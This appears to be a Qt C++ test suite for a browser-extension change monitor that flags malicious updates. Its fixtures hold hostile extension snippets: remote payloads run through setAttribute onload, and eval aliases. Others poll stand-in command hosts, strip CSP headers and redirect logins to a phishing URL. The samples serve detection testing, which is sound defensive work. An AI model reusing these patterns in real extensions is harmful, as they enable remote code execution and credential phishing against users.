#include <QTemporaryDir>
#include <QtTest>

#include "core/analyzer.h"
#include "core/blobstore.h"
#include "core/package.h"
#include "core/database.h"
#include "core/jsanalysis.h"
#include "core/prettify.h"
#include "core/rules.h"
#include "core/scanner.h"
#include "core/signature.h"
#include "core/textdiff.h"
#include "testutil.h"

using namespace extwatch;

namespace {

bool hasRule(const QList<Finding>& findings, const char* rule) {
    for (const Finding& f : findings) {
        if (f.rule == QLatin1StringView(rule)) {
            return true;
        }
    }
    return false;
}

Signature fixtureSignature(const QString& version) {
    const QString dir = testutil::fixtureExtensionDir(version);
    return buildSignature(readManifest(dir), loadSourcesFromDir(dir), testutil::fixtureExtensionId());
}

}  // namespace

class TestAnalysis : public QObject {
    Q_OBJECT
private slots:
    void prettifierIsDeterministicAndIdempotent() {
        const QByteArray minified = "const a=1,b=[1,2,3];function f(x){if(x>1){return x*2}else return 0}"
                                    "const o={k:1,long:function(){return 'v'},arr:[1,2]};f(a);// done\nlet t=`x${a}y`;";
        const QString once = prettifyJavaScript(minified);
        QVERIFY(once.contains(QStringLiteral("function f(x) {")));
        QVERIFY(once.count(u'\n') > 5);
        const QString twice = prettifyJavaScript(once.toUtf8());
        QCOMPARE(twice, once);
        QVERIFY(once.contains(QStringLiteral("`x${a}y`")));  // templates untouched
        QVERIFY(once.contains(QStringLiteral("// done")));
    }

    void prettifierSurvivesBrokenInput() {
        const QString out = prettifyJavaScript("function (( {{ oops");
        QVERIFY(!out.isEmpty());
        QCOMPARE(prettifyJavaScript(QByteArray()), QString());
    }

    void extractsDomainsSinksTimersAndApis() {
        // Written with single quotes only: moc cannot scan raw string literals.
        const QByteArray src =
            "const URL_A = 'https://cdn-updates.example.invalid/cfg';\n"
            "async function poll() {\n"
            "  const r = await fetch(URL_A + '?l=' + navigator.language);\n"
            "  const t = await r.text();\n"
            "  chrome.storage.local.set({ payload: t });\n"
            "}\n"
            "setInterval(poll, 5 * 60 * 1000);\n"
            "chrome.storage.local.get('payload', ({ payload }) => {\n"
            "  const img = document.createElement('img');\n"
            "  img.setAttribute('onload', payload);\n"
            "});\n"
            "eval('1+1');\n"
            "const fn = new Function('return 1');\n"
            "document.addEventListener('keydown', () => {});\n"
            "chrome.declarativeNetRequest.updateDynamicRules({ addRules: [{ action: { responseHeaders: [{ header: 'content-security-policy', operation: 'remove' }] } }] });\n"
            "const ws = new WebSocket('wss://relay.example.invalid/socket');\n";
        const CodeFacts facts = analyzeJavaScript(QStringLiteral("sw.js"), prettifyJavaScript(src).toUtf8());
        QVERIFY(!facts.parseError);
        QStringList hosts;
        for (const DomainRef& d : facts.domains) hosts.append(d.host);
        QVERIFY(hosts.contains(QStringLiteral("cdn-updates.example.invalid")));
        QVERIFY(hosts.contains(QStringLiteral("relay.example.invalid")));
        QVERIFY(facts.chromeApis.contains(QStringLiteral("chrome.storage.local")));
        QVERIFY(facts.chromeApis.contains(QStringLiteral("chrome.declarativeNetRequest.updateDynamicRules")));
        QStringList kinds;
        for (const Sink& s : facts.sinks) kinds.append(s.kind);
        QVERIFY(kinds.contains(QStringLiteral("fetch")));
        QVERIFY(kinds.contains(QStringLiteral("attribute_exec")));
        QVERIFY(kinds.contains(QStringLiteral("eval")));
        QVERIFY(kinds.contains(QStringLiteral("new_function")));
        QVERIFY(kinds.contains(QStringLiteral("storage_get")));
        QVERIFY(kinds.contains(QStringLiteral("dnr_dynamic_rules")));
        QVERIFY(kinds.contains(QStringLiteral("websocket")));
        QCOMPARE(facts.timers.size(), 1);
        QCOMPARE(facts.timers.first().ms, 300000LL);
        QCOMPARE(facts.listeners.size(), 1);
        QCOMPARE(facts.listeners.first().event, QStringLiteral("keydown"));
        QVERIFY(facts.fingerprinting.contains(QStringLiteral("navigator.language")));
        QVERIFY(facts.securityHeaderLiterals.contains(QStringLiteral("content-security-policy")));
        for (const Sink& s : facts.sinks) {
            QVERIFY2(s.line > 0, qPrintable(s.kind));
        }
    }

    void benignUpdateProducesOnlyRoutineFindings() {
        const QList<Finding> findings = compareSignatures(fixtureSignature(QStringLiteral("1.0.0")),
                                                          fixtureSignature(QStringLiteral("1.1.0")));
        QCOMPARE(maxSeverity(findings), Severity::Info);
        QVERIFY(hasRule(findings, "manifest.version"));
        QCOMPARE(findingsSummary(findings), QStringLiteral("routine changes only"));
    }

    void maliciousUpdateIsFlaggedHigh() {
        const QList<Finding> findings = compareSignatures(fixtureSignature(QStringLiteral("1.1.0")),
                                                          fixtureSignature(QStringLiteral("1.2.0")));
        QCOMPARE(maxSeverity(findings), Severity::High);
        QVERIFY(hasRule(findings, "host.all_urls"));
        QVERIFY(hasRule(findings, "permission.sensitive"));
        QVERIFY(hasRule(findings, "remote_code.attribute_exec"));
        QVERIFY(hasRule(findings, "remote_code.storage_to_exec"));
        QVERIFY(hasRule(findings, "network.poller"));
        QVERIFY(hasRule(findings, "headers.strip_security"));
        QVERIFY(hasRule(findings, "content_scripts.broadened"));
        QVERIFY(hasRule(findings, "fingerprinting"));
        // Findings carry locations in the prettified content script / worker.
        bool located = false;
        for (const Finding& f : findings) {
            if (f.rule == QStringLiteral("remote_code.attribute_exec")) {
                QCOMPARE(f.file, QStringLiteral("content.js"));
                QVERIFY(f.line > 0);
                located = true;
            }
        }
        QVERIFY(located);
        const QString summary = findingsSummary(findings);
        QVERIFY2(summary.contains(QStringLiteral("<all_urls>")), qPrintable(summary));
        QVERIFY2(summary.contains(QStringLiteral("cdn-updates.example.invalid")), qPrintable(summary));
        // Sorted by severity, high first.
        QCOMPARE(findings.first().severity, Severity::High);
    }

    void baselineProfileListsCapabilities() {
        const QList<Finding> findings = compareSignatures(Signature(), fixtureSignature(QStringLiteral("1.0.0")));
        QVERIFY(!findings.isEmpty());
        QVERIFY(!hasRule(findings, "manifest.version"));  // no "changed" findings for a baseline
        QCOMPARE(maxSeverity(findings), Severity::Low);   // benign extension: nothing above low
    }

    void signatureRoundTripsThroughJson() {
        const Signature sig = fixtureSignature(QStringLiteral("1.2.0"));
        const Signature back = Signature::fromJson(sig.toJson());
        QCOMPARE(back.version, sig.version);
        QCOMPARE(back.domainHosts(), sig.domainHosts());
        QCOMPARE(back.sinks.size(), sig.sinks.size());
        QCOMPARE(back.timers.size(), sig.timers.size());
        QCOMPARE(back.headerMods.size(), sig.headerMods.size());
        QCOMPARE(back.manifest.hostPermissions, sig.manifest.hostPermissions);
        QCOMPARE(back.manifest.name, QStringLiteral("Screenshot Tool"));
        QCOMPARE(back.contentScriptFiles, sig.contentScriptFiles);
        // Diffing the restored signature gives the same findings as the live one.
        const QList<Finding> a = compareSignatures(Signature(), sig);
        const QList<Finding> b = compareSignatures(Signature(), back);
        QCOMPARE(a.size(), b.size());
    }

    void lineDiffAndHunks() {
        const QStringList a = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j"};
        const QStringList b = {"a", "b", "c", "X", "e", "f", "g", "h", "i", "j", "k"};
        const LineDiff d = diffLines(a, b);
        QCOMPARE(d.added, 2);
        QCOMPARE(d.removed, 1);
        QCOMPARE(d.common, 9);
        const QList<Hunk> hunks = hunksFromDiff(d, 2);
        QVERIFY(hunks.size() >= 1);
        const QString unified = unifiedDiff(QStringLiteral("old"), QStringLiteral("new"), hunks);
        QVERIFY(unified.contains(QStringLiteral("-d\n+X\n")));
        QVERIFY(unified.contains(QStringLiteral("+k\n")));
        QVERIFY(diffLines(a, b, 5).truncated);
    }

    void scanAnalyzesEventsAndRendersReport() {
        QTemporaryDir tmp;
        const QString userData = tmp.path() + QStringLiteral("/User Data");
        const QString dataDir = tmp.path() + QStringLiteral("/data");
        const QString profilePath =
            testutil::makeFakeUserDataDir(userData, QStringLiteral("Default"), QStringLiteral("1.1.0"));
        ScanOptions opts;
        opts.dataDir = dataDir;
        opts.settleSeconds = 0;
        opts.candidates = {{BrowserKind::Chrome, QStringLiteral("Test Chrome"), userData}};
        const ScanResult first = runScan(opts);
        QCOMPARE(first.events.size(), 1);
        QVERIFY(first.events.first().eventRowId.has_value());

        testutil::simulateUpdate(profilePath, QStringLiteral("1.2.0"));
        const ScanResult updated = runScan(opts);
        QCOMPARE(updated.events.size(), 1);
        const ScanEvent& ev = updated.events.first();
        QCOMPARE(ev.kind, QStringLiteral("updated"));
        QCOMPARE(ev.maxSeverity, QStringLiteral("high"));
        QVERIFY(!ev.findingsSummary.isEmpty());
        QVERIFY2(ev.findingsSummary.contains(QStringLiteral("<all_urls>")), qPrintable(ev.findingsSummary));

        Database db;
        QVERIFY(db.open(databasePath(dataDir)));
        BlobStore blobs(dataDir);
        const std::optional<ChangeReport> report = buildChangeReport(db, blobs, *ev.eventRowId);
        QVERIFY(report.has_value());
        QCOMPARE(report->to.version, QStringLiteral("1.2.0"));
        QVERIFY(report->from.has_value());
        QCOMPARE(maxSeverity(report->findings), Severity::High);
        bool sawModifiedContent = false;
        for (const FileChange& c : report->files) {
            if (c.path == QStringLiteral("content.js")) {
                QCOMPARE(c.status, FileChange::Status::Modified);
                sawModifiedContent = true;
            }
            if (c.path == QStringLiteral("rules.json")) {
                QCOMPARE(c.status, FileChange::Status::Added);
            }
        }
        QVERIFY(sawModifiedContent);
        bool addedAllUrls = false;
        for (const QString& line : report->manifestDiff.split(u'\n')) {
            if (line.startsWith(u'+') && line.contains(QStringLiteral("\"<all_urls>\""))) {
                addedAllUrls = true;
            }
        }
        QVERIFY2(addedAllUrls, qPrintable(report->manifestDiff));

        const QString html = renderHtmlReport(db, blobs, *report);
        QVERIFY(html.startsWith(QStringLiteral("<!doctype html>")));
        QVERIFY(html.contains(QStringLiteral("Screenshot Tool")));
        QVERIFY(html.contains(QStringLiteral("Gains access to every website")));
        QVERIFY(html.contains(QStringLiteral("setAttribute")));

        const std::optional<QString> text = fileDisplayText(db, blobs, report->to.id, QStringLiteral("content.js"));
        QVERIFY(text.has_value());
        QVERIFY(text->contains(QStringLiteral("setAttribute('onload', payload)")));
    }

    static Signature sigFromSources(const QList<SourceFile>& files) {
        ManifestFacts m;
        for (const SourceFile& f : files) {
            if (f.path == QStringLiteral("manifest.json")) {
                m = parseManifest(QJsonDocument::fromJson(f.content).object(), [](const QString& x) { return x; });
            }
        }
        return buildSignature(m, files);
    }
    static SourceFile src(const char* path, const QByteArray& content) {
        SourceFile f;
        f.path = QString::fromLatin1(path);
        f.content = content;
        f.size = content.size();
        return f;
    }
    static QByteArray manifestWith(const QByteArray& extra) {
        return "{\"manifest_version\":3,\"name\":\"t\",\"version\":\"1\",\"homepage_url\":\"https://mine.example.com\"" + (extra.isEmpty() ? QByteArray() : "," + extra) + "}";
    }

    void secondEvalInAnotherFileIsStillReported() {
        const Signature v1 = sigFromSources({src("manifest.json", manifestWith("")), src("a.js", "eval(trusted);")});
        const Signature v2 = sigFromSources({src("manifest.json", manifestWith("")), src("a.js", "eval(trusted);"), src("b.js", "eval(remote);")});
        const QList<Finding> f = compareSignatures(v1, v2);
        QVERIFY(hasRule(f, "remote_code.eval"));
    }

    void evalAliasesAndBrowserNamespaceAreSeen() {
        const QByteArray code =
            "(0, eval)(payload);\n"
            "globalThis['eval'](payload);\n"
            "Function(payload)();\n"
            "browser.scripting.executeScript({ target: { tabId: 1 }, func: () => 1 });\n"
            "chrome.scripting.registerContentScripts([{ id: 'x', js: ['x.js'], matches: ['<all_urls>'] }]);\n"
            "const FIVE_MINUTES = 5 * 60 * 1000;\n"
            "setInterval(() => fetch('https://c2.example.invalid/x'), FIVE_MINUTES);\n"
            "chrome.alarms.create('poll', { periodInMinutes: 10 });\n"
            "WebAssembly.instantiate(bytes);\n";
        const CodeFacts facts = analyzeJavaScript(QStringLiteral("sw.js"), code);
        QStringList kinds;
        for (const Sink& k : facts.sinks) kinds.append(k.kind);
        QCOMPARE(kinds.count(QStringLiteral("eval")), 2);
        QVERIFY(kinds.contains(QStringLiteral("new_function")));
        QVERIFY(kinds.contains(QStringLiteral("execute_script")));
        QVERIFY(kinds.contains(QStringLiteral("register_content_scripts")));
        QVERIFY(kinds.contains(QStringLiteral("wasm_instantiate")));
        qint64 interval = 0, alarm = 0;
        for (const TimerRef& t : facts.timers) {
            if (t.kind == QStringLiteral("setInterval")) interval = t.ms;
            if (t.kind == QStringLiteral("alarm")) alarm = t.ms;
        }
        QCOMPARE(interval, 300000LL);  // resolved through the named constant
        QCOMPARE(alarm, 600000LL);
        const Signature sig = sigFromSources({src("manifest.json", manifestWith("")), src("sw.js", code)});
        const QList<Finding> profile = compareSignatures(Signature(), sig);
        QVERIFY(hasRule(profile, "network.poller"));
        QVERIFY(hasRule(profile, "scripting.register"));
    }

    void pollerToPublicHostingIsNotSoftened() {
        const QByteArray code = "setInterval(() => fetch('https://raw.githubusercontent.com/x/y/main/p.js'), 300000);";
        const QList<Finding> f = compareSignatures(Signature(), sigFromSources({src("manifest.json", manifestWith("")), src("sw.js", code)}));
        QVERIFY(hasRule(f, "network.poller"));
    }

    void updateUrlHostBoundary() {
        const Signature v1 = sigFromSources({src("manifest.json", manifestWith("\"update_url\":\"https://clients2.google.com/service/update2/crx\""))});
        const Signature evil = sigFromSources({src("manifest.json", manifestWith("\"update_url\":\"https://evilgoogle.com/update.xml\""))});
        const QList<Finding> f = compareSignatures(v1, evil);
        bool high = false;
        for (const Finding& x : f) if (x.rule == QStringLiteral("update_url.changed")) high = x.severity == Severity::High;
        QVERIFY(high);
    }

    void dnrRemoveIsWorseThanSet() {
        const QByteArray manifest = manifestWith("\"declarative_net_request\":{\"rule_resources\":[{\"id\":\"r\",\"enabled\":true,\"path\":\"rules.json\"}]}");
        const QByteArray setRule = "[{\"id\":1,\"priority\":1,\"action\":{\"type\":\"modifyHeaders\",\"responseHeaders\":[{\"header\":\"content-security-policy\",\"operation\":\"set\",\"value\":\"default-src 'self'\"}]},\"condition\":{\"urlFilter\":\"*\"}}]";
        const QByteArray removeRule = "[{\"id\":1,\"priority\":1,\"action\":{\"type\":\"modifyHeaders\",\"responseHeaders\":[{\"header\":\"content-security-policy\",\"operation\":\"remove\"}]},\"condition\":{\"urlFilter\":\"*\"}},"
                                    "{\"id\":2,\"priority\":1,\"action\":{\"type\":\"redirect\",\"redirect\":{\"url\":\"https://phish.example.invalid/login\"}},\"condition\":{\"urlFilter\":\"login\"}}]";
        const Signature v1 = sigFromSources({src("manifest.json", manifest), src("rules.json", setRule)});
        const Signature v2 = sigFromSources({src("manifest.json", manifest), src("rules.json", removeRule)});
        const QList<Finding> f = compareSignatures(v1, v2);
        QVERIFY(hasRule(f, "headers.strip_security"));  // set -> remove of the same header is a real change
        QVERIFY(hasRule(f, "dnr.redirect"));
        QCOMPARE(maxSeverity(compareSignatures(Signature(), v1)), Severity::Medium);  // a set alone is medium
    }

    void contentScriptsAreComparedPerDeclaration() {
        const QByteArray before = manifestWith("\"content_scripts\":[{\"matches\":[\"https://a.example.com/*\"],\"js\":[\"safe.js\"],\"all_frames\":true},{\"matches\":[\"https://a.example.com/*\"],\"js\":[\"pw.js\"]}]");
        const QByteArray after = manifestWith("\"content_scripts\":[{\"matches\":[\"https://a.example.com/*\"],\"js\":[\"safe.js\"],\"all_frames\":true},{\"matches\":[\"https://a.example.com/*\"],\"js\":[\"pw.js\"],\"all_frames\":true,\"world\":\"MAIN\"}]");
        const QList<Finding> f = compareSignatures(sigFromSources({src("manifest.json", before)}), sigFromSources({src("manifest.json", after)}));
        QVERIFY(hasRule(f, "content_scripts.broadened"));
        QVERIFY(hasRule(f, "content_scripts.main_world"));
    }

    void externallyConnectableIdsWildcard() {
        const QList<Finding> f = compareSignatures(sigFromSources({src("manifest.json", manifestWith("\"externally_connectable\":{\"ids\":[\"abc\"]}"))}),
                                                   sigFromSources({src("manifest.json", manifestWith("\"externally_connectable\":{\"ids\":[\"*\"]}"))}));
        QVERIFY(hasRule(f, "externally_connectable.widened"));
        QCOMPARE(maxSeverity(f), Severity::High);
    }

    void invisibleCharactersAndWasmAreFlagged() {
        QByteArray code = "const a = 'x'; // harmless\n";
        code.append("\xE2\x80\xAE");  // U+202E right-to-left override
        code.append("evil();\n");
        const Signature sig = sigFromSources({src("manifest.json", manifestWith("")), src("a.js", code), src("core.wasm", QByteArray(16, '\0'))});
        QCOMPARE(sig.obfuscation.invisibleChars, 1);
        QCOMPARE(sig.wasmFiles, QStringList{QStringLiteral("core.wasm")});
        const QList<Finding> f = compareSignatures(Signature(), sig);
        QVERIFY(hasRule(f, "unicode.invisible"));
        QVERIFY(hasRule(f, "wasm.added"));
    }

    void deepNestingIsReportedNotHidden() {
        QByteArray code;
        for (int i = 0; i < 900; ++i) code += "(";
        code += "1";
        for (int i = 0; i < 900; ++i) code += ")";
        code += ";";
        const CodeFacts facts = analyzeJavaScript(QStringLiteral("deep.js"), code);
        QVERIFY(!facts.warnings.isEmpty());
        const Signature sig = sigFromSources({src("manifest.json", manifestWith("")), src("deep.js", code)});
        QVERIFY(!sig.analysisWarnings.isEmpty());
        QVERIFY(hasRule(compareSignatures(Signature(), sig), "analysis.incomplete"));
    }

    void zipBombsAreNotInflated() {
        QTemporaryDir tmp;
        const QString zipPath = tmp.path() + QStringLiteral("/bomb.zip");
        QList<SourceFile> files;
        files.append(src("manifest.json", manifestWith("")));
        files.append(src("big.js", QByteArray(40 * 1024 * 1024, ' ')));  // 40 MiB of spaces: ~40000x ratio
        files.append(src("logo.png", QByteArray(1024, 'x')));
        QVERIFY(writeZip(zipPath, files));
        QString error;
        QStringList warnings;
        const QList<SourceFile> loaded = loadSourcesFromPackage(zipPath, &error, &warnings);
        QVERIFY2(error.isEmpty(), qPrintable(error));
        QCOMPARE(loaded.size(), 3);
        bool bigSkipped = false, pngListed = false, manifestLoaded = false;
        for (const SourceFile& f : loaded) {
            if (f.path == QStringLiteral("big.js")) bigSkipped = f.content.isEmpty() && f.size == 40 * 1024 * 1024;
            if (f.path == QStringLiteral("logo.png")) pngListed = f.content.isEmpty() && f.size == 1024;
            if (f.path == QStringLiteral("manifest.json")) manifestLoaded = !f.content.isEmpty();
        }
        QVERIFY(bigSkipped);
        QVERIFY(pngListed);
        QVERIFY(manifestLoaded);
        QVERIFY(!warnings.isEmpty());
        const Signature sig = sigFromSources(loaded);
        QVERIFY(!sig.analysisWarnings.isEmpty());  // the skipped file is reported, not silently clean
    }

    void lineDiffNeverTrustsHashesAlone() {
        // Two distinct lines that share a hash cannot be constructed on purpose here, but the
        // verification path must keep genuinely different lines apart in every case.
        const QStringList a = {"x", "same", "y"};
        const QStringList b = {"x", "same", "z"};
        const LineDiff d = diffLines(a, b);
        QCOMPARE(d.common, 2);
        QCOMPARE(d.added, 1);
        QCOMPARE(d.removed, 1);
    }
};

QTEST_GUILESS_MAIN(TestAnalysis)
#include "test_analysis.moc"
